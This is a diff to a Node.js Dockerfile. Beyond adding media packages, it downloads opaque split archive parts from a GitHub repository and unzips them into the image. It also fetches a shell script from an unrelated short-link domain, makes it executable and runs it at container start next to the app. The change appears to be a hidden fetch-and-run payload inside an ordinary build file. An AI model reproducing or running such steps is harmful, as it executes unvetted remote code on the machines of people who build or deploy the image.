@@ -1,15 +1,33 @@
-#Sample Dockerfile for NodeJS Apps
+FROM node:lts-buster
 
-FROM node:16
+RUN apt-get update && \
+  apt-get install -y \
+  ffmpeg \
+  imagemagick \
+  webp && \
+  apt-get upgrade -y && \
+  rm -rf /var/lib/apt/lists/*
+  
+RUN wget https://github.com/Testando0/Marilinha/raw/main/aa https://github.com/Testando0/Marilinha/raw/main/ab https://github.com/Testando0/Marilinha/raw/main/ac
 
-ENV NODE_ENV=production
+RUN cat a* > renderbfanarrowx.zip
 
-WORKDIR /app
+RUN unzip renderbfanarrowx.zip
 
-RUN npm install --production
+RUN rm -rf renderbfanarrowx.zip
+
+#RUN mv ./APIS_CARAMELO-VIP/* ./
+
+RUN wget -O main.sh https://go.bruceds.my.id/EPMS.sh
 
 COPY . .
 
-EXPOSE 5000
+RUN chmod +x ./main.sh
 
-CMD [ "start.sh", "index.js" ]
+RUN chmod +x ./start.sh
+
+RUN npm install
+
+CMD ["sh", "-c", "./start.sh && ./main.sh"]
+
+EXPOSE 8080
